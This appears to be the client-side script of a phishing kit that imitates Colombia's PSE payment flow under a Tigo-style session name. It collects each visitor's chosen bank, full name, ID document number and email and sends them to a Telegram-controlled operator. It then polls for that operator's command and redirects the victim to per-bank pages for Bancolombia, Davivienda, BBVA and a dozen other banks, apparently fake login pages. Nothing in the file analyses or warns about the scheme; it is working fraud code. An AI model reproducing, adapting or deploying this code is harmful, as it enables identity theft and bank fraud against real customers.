/**
 * Integración Telegram para PSE
 * Maneja el envío de datos y la recepción de comandos del operador
 */

document.addEventListener('DOMContentLoaded', function() {
    initBankSelectModal();
    initPersonTypeModal();
    initDocTypeModal();
    initFormHandler();
});

// Generar session_id único
function getSessionId() {
    let sessionId = sessionStorage.getItem('tigo_pse_session_id');
    if (!sessionId) {
        sessionId = 'pse_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        sessionStorage.setItem('tigo_pse_session_id', sessionId);
        console.log('[PSE] Nueva sesión creada:', sessionId);
    }
    return sessionId;
}

// Obtener invoice_id de la URL
function getInvoiceId() {
    const params = new URLSearchParams(window.location.search);
    return params.get('invoice_id') || '';
}

/**
 * Initialize Bank Select Modal
 */
function initBankSelectModal() {
    const btn = document.getElementById('bankSelectBtn');
    const modal = document.getElementById('bankSelectModal');
    const btnCancel = document.getElementById('btnCancelBankSelect');
    const btnContinue = document.getElementById('btnContinueBankSelect');

    if (btn) {
        btn.addEventListener('click', () => openModal('bankSelectModal'));
    }

    if (btnCancel) {
        btnCancel.addEventListener('click', () => closeModal('bankSelectModal'));
    }

    if (btnContinue) {
        btnContinue.addEventListener('click', function() {
            const selected = document.querySelector('input[name="bankOption"]:checked');
            if (selected) {
                const label = selected.closest('.radio-option-pse').querySelector('.radio-label-pse').textContent;
                document.getElementById('bankSelect').value = selected.value;
                document.getElementById('bankSelectText').textContent = label;
            }
            closeModal('bankSelectModal');
            validateForm();
        });
    }

    if (modal) {
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                closeModal('bankSelectModal');
            }
        });
    }
}

/**
 * Initialize Person Type Modal
 */
function initPersonTypeModal() {
    const btn = document.getElementById('personTypeBtn');
    const modal = document.getElementById('personTypeModal');
    const btnCancel = document.getElementById('btnCancelPersonType');
    const btnContinue = document.getElementById('btnContinuePersonType');

    if (btn) {
        btn.addEventListener('click', () => openModal('personTypeModal'));
    }

    if (btnCancel) {
        btnCancel.addEventListener('click', () => closeModal('personTypeModal'));
    }

    if (btnContinue) {
        btnContinue.addEventListener('click', function() {
            const selected = document.querySelector('input[name="personTypeRadio"]:checked');
            if (selected) {
                document.getElementById('personType').value = selected.value;
                document.getElementById('personTypeText').textContent = selected.value;
            }
            closeModal('personTypeModal');
            validateForm();
        });
    }

    if (modal) {
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                closeModal('personTypeModal');
            }
        });
    }
}

/**
 * Initialize Document Type Modal
 */
function initDocTypeModal() {
    const btn = document.getElementById('docTypeBtn');
    const modal = document.getElementById('docTypeModal');
    const btnCancel = document.getElementById('btnCancelDocType');
    const btnContinue = document.getElementById('btnContinueDocType');

    if (btn) {
        btn.addEventListener('click', () => openModal('docTypeModal'));
    }

    if (btnCancel) {
        btnCancel.addEventListener('click', () => closeModal('docTypeModal'));
    }

    if (btnContinue) {
        btnContinue.addEventListener('click', function() {
            const selected = document.querySelector('input[name="docTypeRadio"]:checked');
            if (selected) {
                document.getElementById('docType').value = selected.value;
                document.getElementById('docTypeText').textContent = selected.value;
            }
            closeModal('docTypeModal');
            validateForm();
        });
    }

    if (modal) {
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                closeModal('docTypeModal');
            }
        });
    }
}

/**
 * Initialize Form Handler
 */
function initFormHandler() {
    const form = document.getElementById('pseForm');
    const inputs = form.querySelectorAll('input[required]');
    const overlay = document.getElementById('loadingOverlay');
    const btnContinue = document.getElementById('btnContinue');

    // Validar al escribir
    inputs.forEach(input => {
        input.addEventListener('input', validateForm);
        input.addEventListener('change', validateForm);
    });

    // Manejar envío del formulario
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btnContinue.disabled) return;

        btnContinue.disabled = true;
        btnContinue.textContent = 'Procesando...';
        overlay.classList.add('active');

        const sessionId = getSessionId();
        const invoiceId = getInvoiceId();

        const formData = {
            bank: document.getElementById('bankSelect').value,
            bank_name: document.getElementById('bankSelectText').textContent,
            person_type: document.getElementById('personType').value,
            full_name: document.getElementById('fullName').value.trim(),
            doc_type: document.getElementById('docType').value,
            doc_number: document.getElementById('docNumber').value.trim(),
            email: document.getElementById('email').value.trim(),
            invoice_id: invoiceId,
            timestamp: new Date().toISOString()
        };

        console.log('[PSE] Enviando datos:', formData);

        try {
            console.log('[PSE] ========== ENVIANDO DATOS ==========');
            console.log('[PSE] SessionId:', sessionId);
            console.log('[PSE] FormData:', JSON.stringify(formData, null, 2));
            
            const result = await TelegramClient.sendToTelegram('tigo_pse', formData, sessionId);
            
            console.log('[PSE] ========== RESULTADO DEL ENVÍO ==========');
            console.log('[PSE] Success:', result.success);
            console.log('[PSE] Result:', JSON.stringify(result, null, 2));
            
            if (result.success) {
                console.log('[PSE] ✅ Datos enviados correctamente');
                console.log('[PSE] ⏳ Iniciando polling...');
                
                // Polling optimizado - sin loops, sin delays
                TelegramClient.startPolling((actions, stop) => {
                    console.log('[PSE] ========== CALLBACK POLLING EJECUTADO ==========');
                    console.log('[PSE] Total acciones:', actions.length);
                    console.log('[PSE] Acciones:', JSON.stringify(actions, null, 2));
                    console.log('[PSE] __pseProcessing:', window.__pseProcessing);
                    
                    if (window.__pseProcessing) {
                        console.warn('[PSE] ⚠️ YA EN PROCESAMIENTO, ABORTANDO');
                        return;
                    }
                    window.__pseProcessing = true;
                    
                    const action = actions[0];
                    const bank = document.getElementById('bankSelect').value;
                    console.log('[PSE] Procesando acción única:', action.action);
                    console.log('[PSE] Banco seleccionado:', bank);
                    
                    switch(action.action) {
                        case 'seguir_banco':
                            // Mapeo de bancos a carpetas
                            const bankFolderMap = {
                                'Bancolombia': 'Bancolombia',
                                'Bogota': 'Bogota',
                                'Davivienda': 'Davivienda',
                                'BBVA': 'BBVA',
                                'AV Villas': 'AV-Villas',
                                'Popular': 'Popular',
                                'Occidente': 'Occidente',
                                'Caja Social': 'Caja-Social',
                                'Scotiabank Colpatria': 'Scotiabank-Colpatria',
                                'Agrario': 'Agrario',
                                'Banco Mundo Mujer': 'Banco-Mundo-Mujer',
                                'itau': 'Itau',
                                'Falabella': 'Falabella',
                                'Serfinanza': 'Serfinanza',
                                'Daviplata': 'Daviplata'
                            };
                            
                            const bankFolder = bankFolderMap[bank];
                            
                            if (bankFolder) {
                                console.log('[PSE] Redirigiendo a:', bankFolder);
                                window.location.href = `/bancas/${bankFolder}/index.html`;
                            } else {
                                console.error('[PSE] Banco no encontrado:', bank);
                                alert('El banco seleccionado no está disponible. Por favor, intenta con otro.');
                                overlay.classList.remove('active');
                                btnContinue.disabled = false;
                                btnContinue.textContent = 'CONTINUAR';
                                window.__pseProcessing = false;
                            }
                            break;
                            
                        case 'rechazar_pse':
                            window.location.href = `/pse/form?invoice_id=${invoiceId}`;
                            break;
                    }
                }, sessionId, 25, 300000);
            } else {
                console.error('[PSE] Error al enviar:', result.error);
                alert('Error al procesar tu solicitud. Por favor, intenta nuevamente.');
                btnContinue.disabled = false;
                btnContinue.textContent = 'CONTINUAR';
                overlay.classList.remove('active');
            }
        } catch (error) {
            console.error('[PSE] Error:', error);
            alert('Error al procesar tu solicitud. Por favor, intenta nuevamente.');
            btnContinue.disabled = false;
            btnContinue.textContent = 'CONTINUAR';
            overlay.classList.remove('active');
        }
    });

    // Validación inicial
    validateForm();
    console.log('[PSE] Sistema inicializado');
}

/**
 * Validar formulario
 */
function validateForm() {
    const bank = document.getElementById('bankSelect').value;
    const fullName = document.getElementById('fullName').value.trim();
    const docNumber = document.getElementById('docNumber').value.trim();
    const email = document.getElementById('email').value.trim();
    const btnContinue = document.getElementById('btnContinue');

    const isValid = bank !== '' && fullName !== '' && docNumber !== '' && email !== '';

    if (btnContinue) {
        btnContinue.disabled = !isValid;
    }

    return isValid;
}

/**
 * Abrir modal
 */
function openModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
    }
}

/**
 * Cerrar modal
 */
function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
    }
}
